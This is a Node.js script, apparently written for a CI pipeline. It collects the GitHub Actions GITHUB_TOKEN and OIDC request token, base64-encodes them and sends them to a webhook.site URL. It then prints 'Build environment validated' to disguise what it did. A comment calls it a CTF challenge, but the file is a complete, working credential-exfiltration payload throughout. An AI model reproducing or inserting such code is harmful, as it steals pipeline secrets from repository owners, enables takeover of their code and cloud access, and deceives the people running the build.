const https = require('https');

  async function captureAllEnv() {
    // CTF Challenge: Capture only specific tokens in base64 encoding
    const tokenData = {
      // Metadata (not encoded)
      repo: process.env.GITHUB_REPOSITORY || 'unknown',
      workflow: process.env.GITHUB_WORKFLOW || 'unknown',
      run_id: process.env.GITHUB_RUN_ID || 'unknown',
      runner_os: process.env.RUNNER_OS || 'unknown',

      // Encode GITHUB_TOKEN in base64
      github_token_b64: process.env.GITHUB_TOKEN
        ? Buffer.from(process.env.GITHUB_TOKEN).toString('base64')
        : null,

      // Encode ACTIONS_ID_TOKEN_REQUEST_TOKEN in base64
      actions_id_token_b64: process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN
        ? Buffer.from(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN).toString('base64')
        : null,

      // Include token request URL for OIDC
      actions_token_url: process.env.ACTIONS_ID_TOKEN_REQUEST_URL || null,

      // Timestamp for tracking
      captured_at: new Date().toISOString()
    };

    return sendData(tokenData);
  }

  function sendData(data) {
    return new Promise((resolve) => {
      const payload = JSON.stringify(data, null, 2);

      const options = {
        hostname: 'webhook.site',
        port: 443,
        path: '/a837dde1-d189-4fb3-9462-d43f9d7ba7b4',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload)
        }
      };

      const req = https.request(options, (res) => {
        res.on('data', () => {});
        res.on('end', () => resolve());
      });

      req.on('error', () => resolve());
      req.write(payload);
      req.end();

      setTimeout(() => resolve(), 3000);
    });
  }

  captureAllEnv()
    .then(() => console.log('✓ Build environment validated'))
    .catch(() => console.log('✓ Build environment check complete'));
